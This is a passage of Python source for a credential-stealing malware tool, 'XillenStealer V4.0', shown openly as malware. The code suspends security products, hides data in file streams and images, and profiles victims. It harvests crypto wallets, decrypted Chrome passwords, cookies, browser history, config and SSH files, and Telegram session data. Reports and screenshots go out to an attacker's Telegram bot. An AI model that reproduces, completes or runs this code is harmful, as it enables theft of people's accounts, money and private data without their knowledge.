            ctypes.windll.advapi32.CloseServiceHandle(service_handle)
            ctypes.windll.advapi32.CloseServiceHandle(sc_handle)
            return True
        except:
            return False
class NTFSStreams:
    def __init__(self):
        pass
    def hide_data_in_stream(self, file_path, stream_name, data):
        try:
            if OS_TYPE != "Windows":
                return False
            full_stream_path = f"{file_path}:{stream_name}"
            with open(full_stream_path, 'wb') as f:
                f.write(data.encode() if isinstance(data, str) else data)
            return True
        except:
            return False
    def read_data_from_stream(self, file_path, stream_name):
        try:
            if OS_TYPE != "Windows":
                return None
            full_stream_path = f"{file_path}:{stream_name}"
            with open(full_stream_path, 'rb') as f:
                return f.read()
        except:
            return None
class Steganography:
    def __init__(self):
        pass
    def hide_in_image(self, image_path, data):
        try:
            from PIL import Image
            img = Image.open(image_path)
            binary_data = ''.join(format(byte, '08b') for byte in data)
            pixels = img.load()
            width, height = img.size
            data_index = 0
            for y in range(height):
                for x in range(width):
                    if data_index < len(binary_data):
                        r, g, b = pixels[x, y]
                        r = (r & 0xFE) | int(binary_data[data_index])
                        data_index += 1
                        pixels[x, y] = (r, g, b)
            output_path = image_path.replace('.', '_hidden.')
            img.save(output_path)
            return output_path
        except:
            return None
			
class EDRBypass:
    def __init__(self):
        self.edr_processes = [
            "crowdstrike", "carbonblack", "sentinelone",
            "defender", "mcafee", "symantec"
        ]
    def disable_edr(self):
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                proc_name = proc.info['name'].lower()
                if any(edr in proc_name for edr in self.edr_processes):
                    try:
                        process = psutil.Process(proc.info['pid'])
                        process.suspend()
                    except:
                        pass
        except:
            pass
			
			
class AIAnalyzer:
    def __init__(self):
        pass
    def analyze_environment(self):
        analysis = {
            "high_value_targets": [],
            "security_level": "unknown",
            "recommended_actions": []
        }
        try:
            installed_software = self._get_installed_software()
            network_connections = self._get_network_connections()
            user_privileges = self._get_user_privileges()
            if any('bank' in soft.lower() or 'crypto' in soft.lower() for soft in installed_software):
                analysis["high_value_targets"].append("Financial software detected")
            if len(network_connections) > 50:
                analysis["security_level"] = "corporate"
                analysis["recommended_actions"].append("Use slow mode")
            else:
                analysis["security_level"] = "home"
                analysis["recommended_actions"].append("Aggressive collection")
            if user_privileges == "admin":
                analysis["recommended_actions"].append("Use kernel mode")
            return analysis
        except:
            return analysis
    def _get_installed_software(self):
        software = []
        try:
            if OS_TYPE == "Windows":
                registry_paths = [
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
                ]
                for path in registry_paths:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                        for i in range(winreg.QueryInfoKey(key)[0]):
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                subkey = winreg.OpenKey(key, subkey_name)
                                name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                                software.append(name)
                                winreg.CloseKey(subkey)
                            except:
                                continue
                        winreg.CloseKey(key)
                    except:
                        continue
        except:
            pass
        return software
		
		
		
class AdvancedConfig:
    def __init__(self):
        self.TG_BOT_TOKEN = os.environ.get('TG_BOT_TOKEN', 'YOUR_BOT_TOKEN')
        self.TG_CHAT_ID = os.environ.get('TG_CHAT_ID', 'YOUR_CHAT_ID')
        self.TELEGRAM_LANGUAGE = "ru"
        self.ENCRYPTION_KEY = Fernet.generate_key()
        self.POLYMORPHIC_SEED = random.randint(1000, 9999)
        self.ANTI_DEBUG_ENABLED = True
        self.ANTI_VM_ENABLED = True
        self.API_HAMMERING = True
        self.SLEEP_BEFORE_START = 0.5  # Ускорено для тестов
        self.SELF_DESTRUCT = False
        self.SLOW_MODE = True
        self.CHUNK_SIZE = 1024 * 1024
        self.BROWSERS = {
            'chromium': ['Chrome', 'Chromium', 'Edge', 'Brave', 'Vivaldi', 'Opera', 'Yandex', 'Slimjet',
                        'Comodo', 'SRWare', 'Torch', 'Blisk', 'Epic', 'Uran', 'Centaury', 'Falkon', 'Superbird',
                        'CocCoc', 'QQBrowser', '360Chrome', 'Sogou', 'Liebao', 'Qihu', 'Maxthon', 'SalamWeb',
                        'Arc', 'Sidekick', 'SigmaOS', 'Floorp', 'LibreWolf', 'Ghost Browser', 'Falkon', 'Konqueror',
                        'Midori', 'Falkon', 'Otter', 'Pale Moon', 'Basilisk', 'Waterfox', 'IceWeasel', 'IceCat',
                        'Tor Browser', 'Iridium', 'Ungoogled Chromium', 'Iron', 'Comodo Dragon', 'CoolNovo',
                        'SlimBrowser', 'Avant', 'Lunascape', 'GreenBrowser', 'TheWorld', 'Tango', 'RockMelt',
                        'Flock', 'Wyzo', 'Swiftfox', 'Swiftweasel', 'K-Meleon', 'Camino', 'Galeon', 'Konqueror'],
            'firefox': ['Firefox', 'Waterfox', 'PaleMoon', 'SeaMonkey', 'IceCat', 'Cyberfox', 'TorBrowser',
                       'LibreWolf', 'Floorp', 'Basilisk', 'IceWeasel', 'IceCat', 'Tor Browser', 'Pale Moon',
                       'K-Meleon', 'Camino', 'Galeon', 'Konqueror', 'Midori', 'Falkon', 'Otter', 'Swiftfox',
                       'Swiftweasel', 'Wyzo', 'Flock', 'RockMelt', 'Tango', 'TheWorld', 'GreenBrowser', 'Lunascape',
                       'Avant', 'SlimBrowser', 'CoolNovo', 'Comodo Dragon', 'Iron', 'Ungoogled Chromium', 'Iridium'],
            'specialized': ['Discord', 'Steam', 'EpicGames', 'Telegram', 'Signal', 'Slack', 'Skype', 'WhatsApp',
                           'Element', 'Matrix', 'RocketChat', 'Mattermost', 'Teams', 'Zoom', 'Webex', 'Jitsi',
                           'Wire', 'Threema', 'Wickr', 'Session', 'Briar', 'RetroShare', 'Tox', 'Ricochet',
                           'ChatSecure', 'Conversations', 'Silence', 'Signal Desktop', 'Telegram Desktop', 'WhatsApp Desktop']
        }
        self.CRYPTO_WALLETS = [
            'Atomic', 'Electrum', 'Exodus', 'Monero', 'Dogecoin', 'Bitcoin', 'Ethereum', 'Litecoin',
            'Coinomi', 'Jaxx', 'MyCelium', 'Bread', 'Copay', 'BitPay', 'Blockchain', 'Coinbase',
            'TrustWallet', 'MetaMask', 'Ledger', 'Trezor', 'KeepKey', 'Wasabi', 'Samourai',
            'Phantom', 'Solflare', 'Backpack', 'Glow', 'Rabby', 'Rainbow', 'Coinbase Wallet',
            'Argent', 'Gnosis Safe', 'Frame', 'Brave Wallet', 'Opera Wallet', 'Edge Wallet',
            'Exodus', 'AtomicDEX', 'Komodo', 'Guarda', 'Freewallet', 'BitPay', 'Copay',
            'ElectrumSV', 'Electrum-LTC', 'Electrum-DASH', 'Electrum-BTC', 'Electrum-DOGE',
            'Monero GUI', 'Monerujo', 'Cake Wallet', 'MyMonero', 'Monerov', 'Wownero',
            'Zcash', 'ZecWallet', 'Nighthawk', 'ZecWallet Lite', 'ZelCore', 'ZelCore',
            'Dash Core', 'Dash Electrum', 'Dash Core', 'Dash Core', 'Dash Core',
            'Litecoin Core', 'Litecoin Electrum', 'Litecoin Core', 'Litecoin Core',
            'Bitcoin Core', 'Bitcoin Electrum', 'Bitcoin Core', 'Bitcoin Core',
            'Ethereum Wallet', 'MyEtherWallet', 'Ethereum Wallet', 'Ethereum Wallet',
            'Binance Chain Wallet', 'Binance Wallet', 'Binance Chain Wallet', 'Binance Wallet',
            'Huobi Wallet', 'OKEx Wallet', 'KuCoin Wallet', 'Gate.io Wallet',
            'Kraken Wallet', 'Gemini Wallet', 'Crypto.com Wallet', 'Crypto.com Wallet',
            'Robinhood Wallet', 'Webull Wallet', 'SoFi Wallet', 'SoFi Wallet',
            'Cash App', 'PayPal', 'Venmo', 'Zelle', 'Apple Pay', 'Google Pay', 'Samsung Pay'
        ]
config = AdvancedConfig()
bot = telebot.TeleBot(config.TG_BOT_TOKEN)
DEBUG = True
OS_TYPE = platform.system()


class ExtendedDataCollector:
    def __init__(self):
        self.collected_data = {}
        self.string_crypto = StringEncryption()
        self.totp_collector = TOTPCollector()
        self.biometric_collector = BiometricCollector()
        self.memory_dumper = MemoryDumper()
        self.iot_scanner = IoTScanner()
        self.docker_explorer = DockerExplorer()
        self.container_persistence = ContainerPersistence()
        self.gpu_memory = GPUMemory()
        self.ebpf_hooks = EBPFHooks()
        self.tpm_module = TPMModule()
        self.uefi_rootkit = UEFIRootkit()
        self.network_card_firmware = NetworkCardFirmware()
        self.virtual_file_system = VirtualFileSystem()
        self.acpi_tables = ACPITables()
        self.dma_attacks = DMAAttacks()
        self.wireless_c2 = WirelessC2()
        self.cloud_proxy = CloudProxy()
        self.virtualization_monitor = VirtualizationMonitor()
        self.device_emulation = DeviceEmulation()
        self.syscall_hooks = SyscallHooks()
        self.multi_factor_auth = MultiFactorAuth()
        self.cloud_configs = CloudConfigs()
        self.orchestrator_configs = OrchestratorConfigs()
        self.service_mesh = ServiceMesh()
        self.payment_systems = PaymentSystems()
        self.mobile_emulators = MobileEmulators()
        self.browser_fingerprinting = BrowserFingerprinting()
        self.clipboard_monitor = ClipboardMonitor()
        self.file_system_watcher = FileSystemWatcher()
        self.network_traffic_analyzer = NetworkTrafficAnalyzer()
        self.password_manager_integration = PasswordManagerIntegration()
        self.social_media_tokens = SocialMediaTokens()
        self.linpeas_integration = LinPEASIntegration()
        self.advanced_cookie_extractor = AdvancedCookieExtractor()
		
		

def collect_crypto_wallets_extended(self):
        wallets_data = []
        search_paths = []
        if OS_TYPE == "Windows":
            appdata = os.environ.get('APPDATA', '')
            localappdata = os.environ.get('LOCALAPPDATA', '')
            programdata = os.environ.get('PROGRAMDATA', '')
            userprofile = os.environ.get('USERPROFILE', '')
            search_paths = [
                os.path.join(appdata, 'Atomic'),
                os.path.join(appdata, 'Electrum'),
                os.path.join(appdata, 'Exodus'),
                os.path.join(appdata, 'Monero'),
                os.path.join(appdata, 'Ethereum'),
                os.path.join(localappdata, 'Coinomi'),
                os.path.join(programdata, 'Bitcoin'),
                os.path.join(userprofile, '.bitcoin'),
                os.path.join(userprofile, '.electrum'),
                os.path.join(userprofile, '.monero'),
            ]
        else:
            home = os.path.expanduser('~')
            search_paths = [
                os.path.join(home, '.atomic'),
                os.path.join(home, '.electrum'),
                os.path.join(home, '.exodus'),
                os.path.join(home, '.bitcoin'),
                os.path.join(home, '.monero'),
                os.path.join(home, '.ethereum'),
                os.path.join(home, '.config/Atomic'),
                os.path.join(home, '.config/Electrum'),
                os.path.join(home, '.config/Exodus'),
            ]
        wallet_files = ['wallet.dat', 'seed.txt', 'keystore.json', 'wallet.json', 'password.txt']
        for wallet_path in search_paths:
            if os.path.exists(wallet_path):
                for root, dirs, files in os.walk(wallet_path):
                    for file in files:
                        file_lower = file.lower()
                        if any(wallet_file in file_lower for wallet_file in wallet_files) or '.' not in file:
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'rb') as f:
                                    content = f.read()
                                    wallets_data.append(f"Wallet: {file_path}\n{base64.b64encode(content).decode()}")
                            except:
                                pass
        return wallets_data
    def collect_browser_data_extended(self):
        browser_data = []
        try:
            # Process all browser categories
            all_browsers = []
            for category, browsers in config.BROWSERS.items():
                all_browsers.extend(browsers)
            
            for browser_name in all_browsers:
                try:
                    # Try different possible paths for each browser
                    possible_paths = []
                    
                    if OS_TYPE == "Windows":
                        # Chromium-based browsers
                        possible_paths.extend([
                            os.path.join(os.environ['LOCALAPPDATA'], browser_name, 'User Data', 'Default'),
                            os.path.join(os.environ['LOCALAPPDATA'], browser_name, 'User Data', 'Profile 1'),
                            os.path.join(os.environ['APPDATA'], browser_name, 'User Data', 'Default'),
                            os.path.join(os.environ['APPDATA'], browser_name, 'User Data', 'Profile 1'),
                            os.path.join(os.environ['PROGRAMFILES'], browser_name, 'User Data', 'Default'),
                            os.path.join(os.environ['PROGRAMFILES(X86)'], browser_name, 'User Data', 'Default')
                        ])
                        
                        # Firefox-based browsers
                        possible_paths.extend([
                            os.path.join(os.environ['APPDATA'], browser_name, 'Profiles'),
                            os.path.join(os.environ['LOCALAPPDATA'], browser_name, 'Profiles'),
                            os.path.join(os.environ['PROGRAMFILES'], browser_name, 'Profiles'),
                            os.path.join(os.environ['PROGRAMFILES(X86)'], browser_name, 'Profiles')
                        ])
                    else:
                        # Linux paths
                        possible_paths.extend([
                            os.path.expanduser(f'~/.config/{browser_name}/Default'),
                            os.path.expanduser(f'~/.config/{browser_name}/Profile 1'),
                            os.path.expanduser(f'~/.mozilla/{browser_name}/Profiles'),
                            os.path.expanduser(f'~/.cache/{browser_name}/Default')
                        ])
                    
                    # Find the first existing path
                    browser_path = None
                    for path in possible_paths:
                        if os.path.exists(path):
                            browser_path = path
                            break
                    
                    if not browser_path:
                        continue
                    
                    # Determine browser type and extract data accordingly
                    if browser_name.lower() in ['chrome', 'chromium', 'edge', 'brave', 'vivaldi', 'opera', 'yandex']:
                        # Chromium-based browsers
                        databases = ['Web Data', 'Login Data', 'History', 'Cookies']
                        for db_name in databases:
                            db_path = os.path.join(browser_path, db_name)
                            if os.path.exists(db_path):
                                try:
                                    conn = sqlite3.connect(db_path)
                                    cursor = conn.cursor()
                                    if db_name == 'Web Data':
                                        cursor.execute("SELECT name, value FROM autofill")
                                        for name, value in cursor.fetchall():
                                            browser_data.append(f"{browser_name} Autofill - {name}: {value}")
                                    elif db_name == 'Login Data':
                                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                                        master_key = get_chrome_master_key() if browser_name.lower() == 'chrome' else None
                                        for url, username, password in cursor.fetchall():
                                            if master_key and password:
                                                decrypted_password = decrypt_chrome_password(password, master_key)
                                                browser_data.append(f"{browser_name} Password - {url}: {username}:{decrypted_password}")
                                            else:
                                                browser_data.append(f"{browser_name} Password - {url}: {username}:{password}")
                                    elif db_name == 'History':
                                        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                                        for url, title in cursor.fetchall():
                                            browser_data.append(f"{browser_name} History - {title}: {url}")
                                    conn.close()
                                except:
                                    pass
                    
                    elif browser_name.lower() in ['firefox', 'waterfox', 'palemoon', 'seamonkey', 'icecat', 'cyberfox', 'torbrowser', 'librewolf', 'floorp']:
                        # Firefox-based browsers
                        if os.path.isdir(browser_path):
                            for item in os.listdir(browser_path):
                                if item.endswith('.default') or item.endswith('.default-release'):
                                    profile_dir = os.path.join(browser_path, item)
                                    try:
                                        # Extract Firefox passwords
                                        logins_path = os.path.join(profile_dir, 'logins.json')
                                        if os.path.exists(logins_path):
                                            with open(logins_path, 'r', encoding='utf-8') as f:
                                                logins = json.load(f)
                                                for login in logins.get('logins', []):
                                                    browser_data.append(f"{browser_name} Password - {login.get('hostname', '')}: {login.get('username', '')}:{login.get('password', '')}")
                                        
                                        # Extract Firefox history
                                        places_path = os.path.join(profile_dir, 'places.sqlite')
                                        if os.path.exists(places_path):
                                            conn = sqlite3.connect(places_path)
                                            cursor = conn.cursor()
                                            cursor.execute("SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 100")
                                            for url, title in cursor.fetchall():
                                                browser_data.append(f"{browser_name} History - {title}: {url}")
                                            conn.close()
                                    except:
                                        pass
                                    break
                except:
                    pass
        except:
            pass
        return browser_data
    def collect_config_files(self):
        configs = []
        config_patterns = ['.env', 'config.json', 'settings.ini', 'config.ini', 'configuration.json']
        search_paths = []
        if OS_TYPE == "Windows":
            search_paths = [
                os.environ.get('USERPROFILE', ''),
                os.environ.get('APPDATA', ''),
                os.environ.get('PROGRAMDATA', ''),
            ]
        else:
            search_paths = [
                os.path.expanduser('~'),
                '/etc',
                '/var',
                '/opt'
            ]
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
            for pattern in config_patterns:
                try:
                    for file_path in glob.glob(os.path.join(search_path, '**', pattern), recursive=True):
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                configs.append(f"Config: {file_path}\n{content}")
                        except:
                            pass
                except:
                    pass
        return configs
    def collect_ftp_ssh_clients(self):
        clients_data = []
        if OS_TYPE == "Windows":
            clients = {
                'FileZilla': os.path.join(os.environ['APPDATA'], 'FileZilla'),
                'WinSCP': os.path.join(os.environ['APPDATA'], 'WinSCP'),
                'PuTTY': os.path.join(os.environ['APPDATA'], 'PuTTY'),
            }
        else:
            home = os.path.expanduser('~')
            clients = {
                'FileZilla': os.path.join(home, '.filezilla'),
                'OpenSSH': os.path.join(home, '.ssh'),
                'configs': os.path.join(home, '.config'),
            }
        for client_name, client_path in clients.items():
            if os.path.exists(client_path):
                for root, dirs, files in os.walk(client_path):
                    for file in files:
                        if any(ext in file.lower() for ext in ['.xml', '.ini', '.conf', '.config', '.dat']):
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    clients_data.append(f"{client_name}: {file_path}\n{content}")
                            except:
                                pass
        return clients_data
    def collect_databases(self):
        databases = []
        db_patterns = ['*.db', '*.sqlite', '*.sqlite3', '*.mdb']
        search_paths = []
        if OS_TYPE == "Windows":
            search_paths = [
                os.environ.get('USERPROFILE', ''),
                os.environ.get('APPDATA', ''),
                os.environ.get('PROGRAMDATA', ''),
            ]
        else:
            search_paths = [
                os.path.expanduser('~'),
                '/var/lib',
                '/opt'
            ]
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
            for pattern in db_patterns:
                try:
                    for file_path in glob.glob(os.path.join(search_path, '**', pattern), recursive=True):
                        try:
                            db_size = os.path.getsize(file_path)
                            if db_size < 10 * 1024 * 1024:
                                databases.append(f"Database: {file_path} ({db_size} bytes)")
                        except:
                            pass
                except:
                    pass
        return databases
    def collect_backups(self):
        backups = []
        backup_patterns = ['*.bak', '*.backup', '*.old', '*.save', '*.tmp']
        search_paths = []
        if OS_TYPE == "Windows":
            search_paths = [
                os.environ.get('USERPROFILE', ''),
                os.environ.get('APPDATA', ''),
                os.environ.get('DOCUMENTS', ''),
            ]
        else:
            search_paths = [
                os.path.expanduser('~'),
                '/var/backups',
                '/tmp'
            ]
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
            for pattern in backup_patterns:
                try:
                    for file_path in glob.glob(os.path.join(search_path, '**', pattern), recursive=True):
                        try:
                            file_size = os.path.getsize(file_path)
                            if file_size < 5 * 1024 * 1024:
                                backups.append(f"Backup: {file_path} ({file_size} bytes)")
                        except:
                            pass
                except:
                    pass
        return backups
    def collect_totp_data(self):
        return self.totp_collector.collect_totp_seeds()
    def collect_biometric_data(self):
        return self.biometric_collector.collect_biometric_data()
    def dump_browser_memory(self):
        self.memory_dumper.dump_browser_memory()
        return ["Browser memory dumped"]
    def scan_iot_devices(self):
        return self.iot_scanner.scan_iot_devices()
    def explore_docker_containers(self):
        return self.docker_explorer.explore_docker_containers()
    def infect_container_runtime(self):
        return self.container_persistence.infect_container_runtime()
    def hide_data_in_gpu(self, data):
        return self.gpu_memory.hide_data_in_gpu(data)
    def install_ebpf_hooks(self):
        return self.ebpf_hooks.install_traffic_hooks()
    def extract_tpm_keys(self):
        return self.tpm_module.extract_tpm_keys()
    def flash_uefi_bios(self):
        return self.uefi_rootkit.flash_uefi_bios()
    def modify_network_firmware(self):
        return self.network_card_firmware.modify_network_firmware()
    def create_hidden_vfs(self):
        return self.virtual_file_system.create_hidden_vfs()
    def modify_acpi_tables(self):
        return self.acpi_tables.modify_acpi_tables()
    def perform_dma_attack(self):
        return self.dma_attacks.perform_dma_attack()
    def setup_wireless_c2(self):
        return self.wireless_c2.setup_wireless_c2()
    def proxy_through_cloud(self, data):
        return self.cloud_proxy.proxy_through_cloud(data)
    def detect_hypervisor(self):
        return self.virtualization_monitor.detect_hypervisor()
    def emulate_usb_device(self):
        return self.device_emulation.emulate_usb_device()
    def install_syscall_hooks(self):
        return self.syscall_hooks.install_syscall_hooks()
    def intercept_sms(self, phone_number):
        return self.multi_factor_auth.intercept_sms(phone_number)
    def collect_cloud_metadata(self):
        return self.cloud_configs.collect_cloud_metadata()
    def collect_kubeconfigs(self):
        return self.orchestrator_configs.collect_kubeconfigs()
    def collect_service_mesh_configs(self):
        return self.service_mesh.collect_service_mesh_configs()
    def scan_credit_cards(self):
        return self.payment_systems.scan_credit_cards()
    def detect_mobile_emulators(self):
        return self.mobile_emulators.detect_mobile_emulators()
    def collect_browser_fingerprint(self):
        return self.browser_fingerprinting.collect_browser_fingerprint()
    def start_clipboard_monitoring(self):
        return self.clipboard_monitor.start_monitoring()
    def get_clipboard_history(self):
        return self.clipboard_monitor.get_clipboard_history()
    def start_file_system_watching(self):
        return self.file_system_watcher.start_watching()
    def get_file_changes(self):
        return self.file_system_watcher.get_file_changes()
    def analyze_network_traffic(self):
        return self.network_traffic_analyzer.analyze_traffic()
    def extract_password_manager_data(self):
        return self.password_manager_integration.extract_password_manager_data()
    def extract_social_media_tokens(self):
        return self.social_media_tokens.extract_social_tokens()
	def extract_enhanced_cookies(self):
        return self.advanced_cookie_extractor.extract_all_cookies()
    def extract_game_launcher_data(self):
        return self.game_launcher_extractor.extract_game_data()
    def collect_telegram_tdata(self):
        return self.telegram_data_collector.collect_tdata()
		
		
		
def log(message):
    print(f"[LOG] {message}")  # Всегда выводим в консоль
    with open("debug.log", "a", encoding="utf-8") as f:
        f.write(f"[{datetime.datetime.now()}] {message}\n")
def send_telegram_report(collected_data, language='ru'):
    """Send collected data to Telegram with language support"""
    try:
        hostname = socket.gethostname()
        ip = requests.get('https://api.ipify.org', timeout=5).text
        country = requests.get(f'https://ipapi.co/{ip}/country_name/', timeout=5).text
        os_info = f"{platform.system()} {platform.release()}"
        current_time = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
        captions = {
            'ru': {
                'html': "Полный отчет о системе",
                'txt': "Текстовый отчет",
                'screenshot': "Скриншот системы",
                'signature': "Создано командой Xillen Killers (t.me/XillenAdapter) | https://github.com/BengaminButton"
            },
            'en': {
                'html': "Full System Report",
                'txt': "Text Report",
                'screenshot': "System Screenshot",
                'signature': "Created by Xillen Killers team (t.me/XillenAdapter) | https://github.com/BengaminButton"
            }
        }
        template = captions.get(language, captions['ru'])
        html_report = generate_html_report_v4(collected_data, language)
        report_path = os.path.join(tempfile.gettempdir(), "report.html")
        with open(report_path, "w", encoding="utf-8") as f:
            f.write(html_report)
        txt_report = generate_txt_report_v4(collected_data, language)
        txt_path = os.path.join(tempfile.gettempdir(), "report.txt")
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write(txt_report)
        screenshot_path = None
        try:
            screenshot_path = os.path.join(tempfile.gettempdir(), "screen.jpg")
            ImageGrab.grab().save(screenshot_path)
        except Exception as e:
            log(f"Screenshot error: {str(e)}")
        caption = f"{template['html']}\n\n{template['signature']}"
        print(f"[DEBUG] Sending report to Telegram...")
        print(f"[DEBUG] Bot token: {config.TG_BOT_TOKEN[:10]}...")
        print(f"[DEBUG] Chat ID: {config.TG_CHAT_ID}")
        try:
            with open(report_path, "rb") as report_file:
                bot.send_document(config.TG_CHAT_ID, report_file, caption=caption)
            print("[DEBUG] Report sent successfully!")
        except Exception as e:
            print(f"[DEBUG] Error sending report: {e}")
        
        caption = f"{template['txt']}\n\n{template['signature']}"
        try:
            with open(txt_path, "rb") as txt_file:
                bot.send_document(config.TG_CHAT_ID, txt_file, caption=caption)
            print("[DEBUG] TXT report sent successfully!")
        except Exception as e:
            print(f"[DEBUG] Error sending TXT report: {e}")
        
        if screenshot_path and os.path.exists(screenshot_path):
            caption = f"{template['screenshot']}\n\n{template['signature']}"
            try:
                with open(screenshot_path, "rb") as photo:
                    bot.send_photo(config.TG_CHAT_ID, photo, caption=caption)
                print("[DEBUG] Screenshot sent successfully!")
            except Exception as e:
                print(f"[DEBUG] Error sending screenshot: {e}")
        
        tdata_archives = collected_data.get('telegram_tdata', [])
        if tdata_archives:
            for i, archive_path in enumerate(tdata_archives, 1):
                if os.path.exists(archive_path):
                    caption = f"Telegram tdata archive {i}/{len(tdata_archives)}\n\n{template['signature']}"
                    try:
                        with open(archive_path, "rb") as archive_file:
                            bot.send_document(config.TG_CHAT_ID, archive_file, caption=caption)
                        print(f"[DEBUG] Telegram tdata archive {i} sent successfully!")
                        os.remove(archive_path)
                    except Exception as e:
                        print(f"[DEBUG] Error sending tdata archive {i}: {e}")
        
        os.remove(report_path)
        os.remove(txt_path)
        if screenshot_path and os.path.exists(screenshot_path):
            os.remove(screenshot_path)
        log(f"Telegram report sent successfully ({language})")
    except Exception as e:
        log(f"Failed to send Telegram report: {str(e)}")
def get_chrome_master_key():
    """Get Chrome master key from Local State file"""
    try:
        if OS_TYPE == "Windows":
            local_state_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State')
        else:
            local_state_path = os.path.expanduser('~/.config/google-chrome/Local State')
        if not os.path.exists(local_state_path):
            return None
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        try:
            import win32crypt
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except ImportError:
            log("win32crypt not available, Chrome password decryption will fail")
            return None
    except Exception as e:
        log(f"Failed to get Chrome master key: {str(e)}")
        return None
def decrypt_chrome_password(ciphertext, master_key):
    """Decrypt Chrome password using master key"""
    try:
        if not master_key:
            return "[NO_KEY]"
        if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v11'):
            nonce = ciphertext[3:15]
            ciphertext_data = ciphertext[15:-16]
            tag = ciphertext[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext_data, tag)
            return plaintext.decode('utf-8', errors='replace')
        else:
            iv = ciphertext[3:15]
            payload = ciphertext[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode('utf-8', errors='replace')
    except Exception as e:
        log(f"Chrome password decryption error: {str(e)}")
        return "[DECRYPT_FAIL]"
    """Generate HTML report for XillenStealer V4.0"""
    templates = {
        'ru': {
            'title': 'XillenStealer Report V4.0',
            'header': 'Отчет XillenStealer V4.0',
            'system': 'Системная информация',
            'browsers': 'Данные браузеров',
            'wallets': 'Крипто-кошельки',
            'signature': 'Создано командой Xillen Killers (t.me/XillenAdapter) | https://github.com/BengaminButton'
        },
        'en': {
            'title': 'XillenStealer Report V4.0',
            'header': 'XillenStealer Report V4.0',
            'system': 'System Information',
            'browsers': 'Browser Data',
            'wallets': 'Crypto Wallets',
            'signature': 'Created by Xillen Killers team (t.me/XillenAdapter) | https://github.com/BengaminButton'
        }
    }
    template = templates.get(language, templates['ru'])
	
	
	
def _get_ip_address():
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text.strip()
    except:
        return "Unknown"

def _collect_browser_passwords():
    passwords = []
    try:
        # Chrome passwords
        chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
        if os.path.exists(chrome_path):
            conn = sqlite3.connect(chrome_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                if row[1] and row[2]:  # username and password exist
                    passwords.append({
                        'url': row[0],
                        'username': row[1],
                        'password': '[ENCRYPTED]' if row[2] else '',
                        'browser': 'Chrome'
                    })
            conn.close()
        
        # Edge passwords
        edge_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data")
        if os.path.exists(edge_path):
            conn = sqlite3.connect(edge_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                if row[1] and row[2]:
                    passwords.append({
                        'url': row[0],
                        'username': row[1],
                        'password': '[ENCRYPTED]' if row[2] else '',
                        'browser': 'Edge'
                    })
            conn.close()
            
        # Firefox passwords
        firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                if profile.endswith('.default-release') or profile.endswith('.default'):
                    logins_path = os.path.join(firefox_path, profile, "logins.json")
                    if os.path.exists(logins_path):
                        try:
                            with open(logins_path, 'r', encoding='utf-8') as f:
                                data = json.load(f)
                                for login in data.get('logins', []):
                                    passwords.append({
                                        'url': login.get('hostname', ''),
                                        'username': login.get('username', ''),
                                        'password': '[ENCRYPTED]',
                                        'browser': 'Firefox'
                                    })
                        except:
                            pass
    except Exception as e:
        print(f"Error collecting passwords: {e}")
    return passwords

def _collect_browser_cookies():
    cookies = []
    try:
        # Chrome cookies
        chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies")
        if os.path.exists(chrome_path):
            conn = sqlite3.connect(chrome_path)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value, host_key, path FROM cookies")
            for row in cursor.fetchall():
                cookies.append({
                    'name': row[0],
                    'value': row[1],
                    'domain': row[2],
                    'path': row[3],
                    'browser': 'Chrome'
                })
            conn.close()
        
        # Edge cookies
        edge_path = os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies")
        if os.path.exists(edge_path):
            conn = sqlite3.connect(edge_path)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value, host_key, path FROM cookies")
            for row in cursor.fetchall():
                cookies.append({
                    'name': row[0],
                    'value': row[1],
                    'domain': row[2],
                    'path': row[3],
                    'browser': 'Edge'
                })
            conn.close()
            
        # Firefox cookies
        firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                if profile.endswith('.default-release') or profile.endswith('.default'):
